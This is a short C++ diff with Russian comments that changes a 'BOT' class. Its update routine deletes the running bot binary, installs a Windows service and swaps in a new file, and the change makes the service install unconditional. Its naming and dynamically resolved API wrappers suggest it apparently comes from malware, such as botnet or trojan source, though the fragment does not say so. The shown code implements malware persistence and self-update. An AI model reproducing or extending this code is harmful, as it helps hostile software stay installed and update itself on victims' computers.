@@ -1052,7 +1052,7 @@ void BOT::SavePrefixFromTemporaryFile()
 		string PrefixFile = Bot->PrefixFileName();
 		string Prefix = LoadPrefixFromFile(TempName.t_str());
 		if (!Prefix.IsEmpty())
-			SavePrefixToFile(PrefixFile.t_str());
+			File::WriteBufferA(PrefixFile.t_str(), Prefix.t_str(), Prefix.Length());
 		pDeleteFileA(TempName.t_str());
     }
 }
@@ -1091,7 +1091,7 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 		DeleteSettings();
 
 	// Деинсталируем сервис
-	bool ServiceInstalled = UninstallService();
+	UninstallService();
 
     // Удаляем текущую версию бота
 	if (FileExistsA(BotFile.t_str()))
@@ -1109,8 +1109,7 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 	}
 
     // инсталируем сервис
-	if (ServiceInstalled)
-		InstallService(FileName);
+	InstallService(FileName);
 
 	// Перемещаем файл
 	bool Result = pMoveFileExA(FileName, BotFile.t_str(), MOVEFILE_REPLACE_EXISTING ) != 0;
